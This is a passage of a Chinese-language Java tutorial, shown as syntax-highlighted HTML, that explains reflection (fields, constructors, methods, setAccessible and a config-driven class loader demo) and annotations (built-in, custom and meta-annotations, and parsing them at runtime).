punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"==============================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.Field[] getDeclaredFields()</span>        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> declaredFields <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> declaredFields<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//4.Field getDeclaredField(String name)</span>        <span class="token class-name">Field</span> d <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//忽略访问权限修饰符的安全检查</span>        d<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//暴力反射</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token comment">/*获取构造方法*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//0.获取Person的Class对象</span>        <span class="token class-name">Class</span> personClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">//1.Constructer&lt;?>[] getConstructors()</span>        <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.Constructer\&lt;T\> getConstructor(类&lt;?>... parameterTypes)</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//创建对象</span>        <span class="token class-name">Object</span> person <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor1 <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> person2 <span class="token operator">=</span> constructor1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//空参构造（已过时）</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> personClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">/**         获取成员方法们         1. 获取所有方法：Method[] getMethods()         2. 获取指定方法：Method getMethod()         3. Method[] getDeclaredMethods()         4. Method getDeclaredMethod()         */</span>        <span class="token comment">//获取指定名称的方法</span>        <span class="token class-name">Method</span> eat <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"eat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        eat<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> eat1 <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"eat"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        eat1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取所有方法</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="23-反射案例"><a class="markdownIt-Anchor" href="#23-反射案例">#</a> 2.3 反射案例</h2><ul><li>需求：写一个 &quot;框架&quot;，不能改变该类的任何代码的前提下，可以帮我们创建任意类的对象，并且可以执行任意类的方法<ul><li>实现：<ol><li>配置文件</li><li>反射</li></ol></li><li>步骤：<ol><li>将需要创建的对象的全类名和需要执行的方法定义在配置文件中</li><li>在程序中加载读取配置文件</li><li>使用反射技术来加载类文件进内存</li><li>创建对象</li><li>执行方法</li></ol></li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token comment">/** * 假设的框架类 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//可以创建任意类的对象，可以执行任意方法</span>        <span class="token comment">/**         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法         */</span><span class="token comment">//        Person p = new Person();</span><span class="token comment">//        p.eat();</span>        <span class="token comment">//1.加载配置文件</span>        <span class="token comment">//1.1创建Properties对象</span>        <span class="token class-name">Properties</span> pro <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//1.2加载配置文件，转换为一个集合</span>        <span class="token comment">//1.2.1获取ckass目录下的配置文件</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ReflectTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"pro.properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pro<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取配置文件中定义的数据</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> pro<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"className"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> pro<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"methodName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.加载该类进内存</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.创建对象</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//5.获取方法对象</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//6.执行方法</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注：类加载器没学，回头补上</p></blockquote><h1 id="3-注解"><a class="markdownIt-Anchor" href="#3-注解">#</a> 3、注解</h1><ul><li>概念：说明程序的，给计算机看的</li><li>注释：用文字描述程序的。给程序员看的</li><li>概念描述：<ul><li>JDK1.5 之后的新特性</li><li>说明程序的</li><li>使用注解：<strong>@注解名称</strong></li></ul></li><li>作用分类：<ol><li>编写文档：通过代码里标识的注解生成文档【生成文档 doc 文档】</li><li>代码分析：通过代码里标识的注解对代码进行分析【使用反射】——<strong> 经常使用</strong></li><li>编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】</li></ol></li></ul><h2 id="31-jdk中预定义的一些注解"><a class="markdownIt-Anchor" href="#31-jdk中预定义的一些注解">#</a> 3.1 JDK 中预定义的一些注解</h2><ul><li>@Override：监测点被该注解标注的方法是否是继承自父类（接口）的</li><li>@Depreciated：该注解标注的内容已过时，</li><li>@SuppressWarnings：压制警告 ——@SuppressWarnings (“all”)，一般传 all，写在类上</li></ul><h2 id="32-自定义注解"><a class="markdownIt-Anchor" href="#32-自定义注解">#</a> 3.2 自定义注解</h2><ul><li><p>格式：</p><ul><li>元注解</li><li><strong>public @interface 注解名称 {属性列表}</strong></li></ul></li><li><p>本质：注解本质上就是一个接口，该接口默认继承 Annotation 接口</p><ul><li>public interface MyAnno extends java.lang.annotation.Annotation{}</li></ul></li><li><p>java 反编译命令：javap java.class 文件</p></li><li><p>属性：接口中可以定义的一成员方法</p><ul><li><p>要求：</p><ol><li><p>属性的返回值类型有下列取值，其他不行</p><ul><li><p>基本数据类型（void 不行）</p></li><li><p>String</p></li><li><p>枚举</p></li><li><p>注解</p></li><li><p>以上类型的数组</p></li></ul></li><li><p>定义了属性，在使用时需要给属性赋值</p><ol><li><p>如果定义属性时，使用 default 关键字给属性默认初始化值，则使用注解时可以不进行属性的赋值</p></li><li><p>如果只有一个属性需要赋值，并且属性的名称是 value，则 value 可以省略，直接定义值即可</p><p>定义：String name () default “张三”;使用：@MyAnno (name = “李四”);</p></li><li><p>数组赋值时值使用大括号包裹。如果数组中只有一个值，则大括号可以省略</p></li></ol></li></ol></li></ul></li><li><p>元注解：用于描述注解的注解</p><ul><li>@Target：描述注解能够作用的位置<ul><li>ElementType 取值：<ul><li>TYPE: 可以作用于类上</li><li>METHOD: 可以作用于方法上</li><li>FIELD: 可以作用于成员变量上</li></ul></li></ul></li><li>@Retention：描述注解被保留的阶段<ul><li>@Retention (RetentionPolicy.RUNTIME)：当前被描述的注解会保留到 class 字节码文件中并被 JVM 读取到</li></ul></li><li>@Documented：描述注解是否被抽取到 API 文档中</li><li>@Inherited：描述注解是否被类的子类继承</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>annocation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">/** * 元注解：用于描述注解的注解     - @Target：描述注解能够作用的位置     - @Retention：描述注解被保留的阶段     - @Documented：描述注解是否被抽取到API文档中     - @Inherited：描述注解是否被子类继承 */</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">,</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>METHOD<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//表示该MyAnno3只能作用于类上</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Inherited</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">MyAnno3</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="33-在程序中使用解析注解获取注解中定义的属性值"><a class="markdownIt-Anchor" href="#33-在程序中使用解析注解获取注解中定义的属性值">#</a> 3.3 在程序中使用（解析）注解：获取注解中定义的属性值</h2><ol><li>获取注解定义的位置的对象Class/Method/Field 对象</li><li>获取指定的注解<ul><li>getAnnotation(Class)</li><li>这行命令执行后其实就是在内存中生成了一个该注解接口的子类实现对象</li></ul></li><li>调用注解中的抽象方法来获取配置的属性值</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>annocation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token comment">/** * 假设的框架类 */</span><span class="token annotation punctuation">@Pro</span><span class="token punctuation">(</span>className <span class="token operator">=</span> <span class="token string">"cn.itclass.annocation.Demo1"</span><span class="token punctuation">,</span>methodName <span class="token operator">=</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//可以创建任意类的对象，可以执行任意方法</span>        <span class="token comment">/**         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法         */</span>        <span class="token comment">//1.解析注解</span>        <span class="token comment">//1.1获取该类的字节码文件对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ReflectTest</span><span class="token punctuation">></span></span> reflectTestClass <span class="token operator">=</span> <span class="token class-name">ReflectTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取上边的注释对象</span>        <span class="token comment">//其实就是在内存中生成了一个该注解接口的子类实现对象</span>        <span class="token class-name">Pro</span> annotation <span class="token operator">=</span> reflectTestClass<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Pro</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.调用注解对象中定义的抽象方法，获取返回值</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">className</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">methodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//下面与reflect一样</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>annocation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token 